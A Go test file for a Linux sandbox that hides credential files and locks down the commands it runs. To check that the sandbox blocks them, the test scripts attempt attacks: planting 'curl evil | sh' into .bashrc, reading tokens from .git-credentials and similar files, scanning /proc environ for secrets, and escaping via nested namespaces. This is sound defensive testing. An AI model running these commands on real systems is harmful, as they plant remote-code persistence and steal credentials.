// Copyright (c) 2025 Reliant Labs
//go:build linux

package credsandbox

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestMain lets this test binary stand in for the reliant binary as the sandbox
// helper, as cmd/reliant's main does.
func TestMain(m *testing.M) {
	Dispatch()
	os.Exit(m.Run())
}

func selfPath(t *testing.T) string {
	t.Helper()
	self, err := os.Executable()
	require.NoError(t, err)
	return self
}

// requireSandbox skips on a host that does not allow unprivileged user, mount
// and PID namespaces (the package fails closed there; see TestRefusesWhen...).
func requireSandbox(t *testing.T) {
	t.Helper()
	if err := Available(selfPath(t)); err != nil {
		t.Skipf("this host does not allow the sandbox: %v", err)
	}
}

// run executes script under the sandbox with plan and returns its combined output.
func run(t *testing.T, plan Plan, script string) (string, int) {
	t.Helper()
	cmd := exec.Command("bash", "-c", script)
	cmd.Env = []string{"PATH=" + os.Getenv("PATH"), "HOME=" + os.Getenv("HOME")} //nolint:forbidigo // the test's own PATH for the command under test
	if refusal := Apply(cmd, selfPath(t), plan); refusal != "" {
		t.Fatalf("sandbox refused: %s", refusal)
	}
	out, err := cmd.CombinedOutput()
	code := 0
	if err != nil {
		ee, ok := err.(*exec.ExitError)
		require.True(t, ok, "%v", err)
		code = ee.ExitCode()
	}
	return string(out), code
}

// fakeHome is a home directory laid out like a daemon's, with a credential in
// every place the review named.
func fakeHome(t *testing.T) string {
	t.Helper()
	home := t.TempDir()
	write := func(rel, content string) {
		p := filepath.Join(home, rel)
		require.NoError(t, os.MkdirAll(filepath.Dir(p), 0o755))
		require.NoError(t, os.WriteFile(p, []byte(content), 0o600))
	}
	write(".reliant/daemon.json", "PAT-daemon")
	write(".reliant/forge-token-cache.json", "PAT-cache")
	write(".reliant/reliant.md", "memory")
	write(".reliant/other.txt", "other")
	write(".config/forge/credentials.json", "PAT-forge")
	write(".config/forge/storage.json", "storage")
	write(".git-credentials", "PAT-git")
	write(".bashrc", "# rc")
	write("work/a.txt", "work")
	return home
}

func planFor(home string) Plan {
	return Plan{
		Hide: []string{
			filepath.Join(home, ".reliant/daemon.json"),
			filepath.Join(home, ".reliant/forge-token-cache.json"),
			filepath.Join(home, ".config/forge/credentials.json"),
			filepath.Join(home, ".git-credentials"),
		},
		ReadOnly: []string{filepath.Join(home, ".bashrc"), filepath.Join(home, ".reliant/reliant.md")},
	}
}

func TestSandbox_HidesCredentialFilesAndKeepsTheRest(t *testing.T) {
	requireSandbox(t)
	home := fakeHome(t)

	out, code := run(t, planFor(home), `
cd "`+home+`"
for f in .reliant/daemon.json .reliant/forge-token-cache.json .config/forge/credentials.json .git-credentials; do
  if cat "$f" 2>/dev/null; then echo "LEAK $f"; fi
  [ -e "$f" ] && echo "VISIBLE $f"
done
echo "kept: $(cat work/a.txt) $(cat .reliant/other.txt) $(cat .config/forge/storage.json)"
`)
	assert.Equal(t, 0, code, out)
	assert.NotContains(t, out, "PAT-", "no credential content may reach the command")
	assert.NotContains(t, out, "LEAK")
	assert.NotContains(t, out, "VISIBLE")
	assert.Contains(t, out, "kept: work other storage")
}

func TestSandbox_CommandCanStillWriteItsWorkspace(t *testing.T) {
	requireSandbox(t)
	home := fakeHome(t)

	out, code := run(t, planFor(home), `cd "`+home+`/work" && echo new > b.txt && echo edited >> a.txt && mkdir sub && echo ok`)
	require.Equal(t, 0, code, out)

	b, err := os.ReadFile(filepath.Join(home, "work/b.txt"))
	require.NoError(t, err)
	assert.Equal(t, "new\n", string(b), "writes under the workspace reach the real disk")
	a, err := os.ReadFile(filepath.Join(home, "work/a.txt"))
	require.NoError(t, err)
	assert.Equal(t, "workedited\n", string(a))
}

// A file the daemon replaces by rename (an atomic credential refresh) must not
// show up through the sandbox: hiding is by absence, not by a mount over the
// old file.
func TestSandbox_ARenamedCredentialFileStaysHidden(t *testing.T) {
	requireSandbox(t)
	home := fakeHome(t)
	gate := filepath.Join(home, "gate")
	require.NoError(t, syscallMkfifo(gate))

	cmd := exec.Command("bash", "-c", `cd "`+home+`"; echo ready > work/ready; read x < gate; cat .reliant/daemon.json 2>/dev/null; ls .reliant`)
	cmd.Env = []string{"PATH=" + os.Getenv("PATH")} //nolint:forbidigo // the test's own PATH for the command under test
	require.Empty(t, Apply(cmd, selfPath(t), planFor(home)))
	var out strings.Builder
	cmd.Stdout, cmd.Stderr = &out, &out
	require.NoError(t, cmd.Start())

	waitFor(t, filepath.Join(home, "work/ready"))
	tmp := filepath.Join(home, ".reliant/daemon.json.tmp")
	require.NoError(t, os.WriteFile(tmp, []byte("PAT-rotated"), 0o600))
	require.NoError(t, os.Rename(tmp, filepath.Join(home, ".reliant/daemon.json")))
	require.NoError(t, os.WriteFile(gate, []byte("go\n"), 0o600))
	require.NoError(t, cmd.Wait())

	assert.NotContains(t, out.String(), "PAT-")
	assert.NotContains(t, out.String(), "daemon.json")
}

func TestSandbox_AReadOnlyFileCannotBePlantedWith(t *testing.T) {
	requireSandbox(t)
	home := fakeHome(t)

	out, code := run(t, planFor(home), `cd "`+home+`"; echo 'curl evil | sh' >> .bashrc; echo "rc=$?"; echo hijack > .reliant/reliant.md; echo "rc=$?"; echo edit > work/a.txt && echo work-writable`)
	assert.Equal(t, 0, code, out)
	assert.Equal(t, 2, strings.Count(out, "rc=1"), out)
	assert.Contains(t, out, "work-writable")

	rc, err := os.ReadFile(filepath.Join(home, ".bashrc"))
	require.NoError(t, err)
	assert.Equal(t, "# rc", string(rc), "the real startup file is untouched")
}

func TestSandbox_ItsOwnProcessTreeOnly(t *testing.T) {
	requireSandbox(t)

	out, code := run(t, Plan{}, `ls /proc | grep -c '^[0-9][0-9]*$'; echo pid1=$(cat /proc/1/comm 2>&1)`)
	require.Equal(t, 0, code, out)
	lines := strings.Fields(out)
	require.NotEmpty(t, lines)
	assert.LessOrEqual(t, lines[0], "6", "a handful of processes (the init, bash, ls, grep), not the machine's: %s", out)
	assert.NotContains(t, out, "cat: /proc/1/comm", "the init is visible by name only")
}

func TestSandbox_CannotReadTheDaemonsEnvironmentThroughProc(t *testing.T) {
	requireSandbox(t)
	t.Setenv("RELIANT_SANDBOX_TEST_SECRET", "env-secret-value")

	out, code := run(t, Plan{}, `
for p in $(ls /proc | grep '^[0-9][0-9]*$'); do
  tr '\0' '\n' < /proc/$p/environ 2>/dev/null | grep RELIANT_SANDBOX_TEST_SECRET
done
echo done`)
	assert.Equal(t, 0, code, out)
	assert.NotContains(t, out, "env-secret-value")
}

func TestSandbox_HasNoCapabilitiesAndCannotGainAny(t *testing.T) {
	requireSandbox(t)

	home := fakeHome(t)
	out, code := run(t, planFor(home), `
grep -E '^(CapInh|CapPrm|CapEff|CapBnd|CapAmb|NoNewPrivs):' /proc/self/status
mount -t tmpfs none /tmp 2>&1 && echo MOUNT-OK
# A namespace of its own gives root over ITS mounts only. Mounts the sandbox made are
# locked against it, so it can neither unmount them nor see what they cover.
unshare --user --map-root-user --mount sh -c '
  umount "`+home+`/.reliant" 2>&1; umount "`+home+`" 2>&1
  cat "`+home+`/.reliant/daemon.json" "`+home+`/.git-credentials" 2>&1' 2>&1
true`)
	assert.Equal(t, 0, code, out)
	for _, c := range []string{"CapInh", "CapPrm", "CapEff", "CapBnd", "CapAmb"} {
		assert.Contains(t, out, c+":\t0000000000000000", out)
	}
	assert.Contains(t, out, "NoNewPrivs:\t1")
	assert.NotContains(t, out, "MOUNT-OK", "the command cannot mount")
	assert.NotContains(t, out, "PAT-", "a nested namespace does not undo the sandbox")
}

// Files the command creates directly in a directory the sandbox had to rebuild
// (the home directory, when a credential file lives in it) are on the sandbox's
// own tmpfs and are gone when it exits. Entries that existed, and everything
// below them, are the real ones. This pins the cost so it is not a surprise.
func TestSandbox_NewEntriesInARebuiltDirectoryDoNotOutliveTheCommand(t *testing.T) {
	requireSandbox(t)
	home := fakeHome(t)

	out, code := run(t, planFor(home), `cd "`+home+`"; echo x > newtop; echo y > work/inner; cat newtop`)
	require.Equal(t, 0, code, out)
	assert.Contains(t, out, "x")

	_, err := os.Stat(filepath.Join(home, "newtop"))
	assert.True(t, os.IsNotExist(err), "a new top-level entry in a rebuilt directory is not kept")
	inner, err := os.ReadFile(filepath.Join(home, "work/inner"))
	require.NoError(t, err)
	assert.Equal(t, "y\n", string(inner), "an entry below an existing one is the real directory")
}

func TestSandbox_PassesExitStatusAndSignals(t *testing.T) {
	requireSandbox(t)

	_, code := run(t, Plan{}, `exit 7`)
	assert.Equal(t, 7, code)

	_, code = run(t, Plan{}, `nosuchcommand_xyz`)
	assert.Equal(t, 127, code)
}

func TestSandbox_DoesNotLeakTheHelpersOwnVariable(t *testing.T) {
	requireSandbox(t)

	out, code := run(t, Plan{}, `env`)
	require.Equal(t, 0, code, out)
	assert.NotContains(t, out, specFDEnv)
}

func TestSandbox_HidesAFileUnderEveryPathTheDiskHas(t *testing.T) {
	requireSandbox(t)
	home := fakeHome(t)
	// The same directory through a second path (a bind mount made by the test's
	// own namespace is not possible without privilege, so a symlinked parent
	// stands in for the platform's second mount of the disk).
	alias := filepath.Join(t.TempDir(), "alias")
	require.NoError(t, os.Symlink(home, alias))

	plan := Plan{Hide: []string{filepath.Join(alias, ".reliant/daemon.json")}}
	out, code := run(t, plan, `cat "`+filepath.Join(home, ".reliant/daemon.json")+`" 2>&1; echo "rc=$?"`)
	assert.Equal(t, 0, code, out)
	assert.NotContains(t, out, "PAT-daemon")
	assert.Contains(t, out, "rc=1")
}

func TestSandbox_RefusesWhenTheHelperIsMissing(t *testing.T) {
	cmd := exec.Command("true")
	refusal := Apply(cmd, filepath.Join(t.TempDir(), "no-such-binary"), Plan{})
	assert.Contains(t, refusal, "not run")
	assert.Contains(t, refusal, "credential files")
}

func TestAliasPaths_FollowsTheSameDiskThroughOtherMounts(t *testing.T) {
	mounts := parseMounts(strings.Join([]string{
		`1 1 8:0 /home /home/workspace rw - ext4 /dev/d rw`,
		`2 1 8:0 / /mnt/workspace-disk rw - ext4 /dev/d rw`,
		`3 1 0:34 /abc-daemon.json /home/workspace/.reliant/daemon.json rw - virtiofs x rw`,
		`4 1 8:0 /tmp /tmp rw - ext4 /dev/d rw`,
	}, "\n"))

	got := aliasPaths([]string{"/home/workspace/.config/forge/credentials.json"}, mounts)
	assert.Equal(t, []string{"/mnt/workspace-disk/home/.config/forge/credentials.json"}, got)

	got = aliasPaths([]string{"/mnt/workspace-disk/home/.config/forge/credentials.json"}, mounts)
	assert.Equal(t, []string{"/home/workspace/.config/forge/credentials.json"}, got)

	// The file the platform bind-mounts over is the same file on the disk underneath.
	got = aliasPaths([]string{"/home/workspace/.reliant/daemon.json"}, mounts)
	assert.Empty(t, got, "a different device: its aliases are the other mounts of THAT device only")
}

func TestUnescapeMount(t *testing.T) {
	assert.Equal(t, "/a b/c", unescapeMount(`/a\040b/c`))
	assert.Equal(t, "/plain", unescapeMount("/plain"))
}
